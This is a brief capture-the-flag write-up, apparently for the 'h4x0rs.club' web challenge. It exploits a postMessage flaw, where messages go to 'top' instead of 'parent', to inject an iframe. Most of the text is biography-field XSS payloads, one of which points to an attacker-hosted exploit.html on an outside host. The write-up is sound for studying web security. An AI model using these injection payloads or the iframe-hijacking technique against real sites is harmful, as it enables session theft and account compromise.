# h4x0rs.club

Upload [exploit.html](exploit.html) and [alert.js](alert.js) to `l4w.io` for example.

Create 2 users: `blah1` && `blah2`

Root cause:

Because on the backend side, they will send a message to `top` not `parent` . so we can inject our evil iframe in the middle.

### blah1
Set biography as the following:
```
<a href='//l4w.io/exploit.html' id=report-btn>
```

### blah2
Set biography as the following:
```
<a href='/game/?msg=<iframe name=game_server src=/game/user.php/blah1%23report><iframe>' id=report-btn></a>
```

Then report `blah2` user along with `#report`


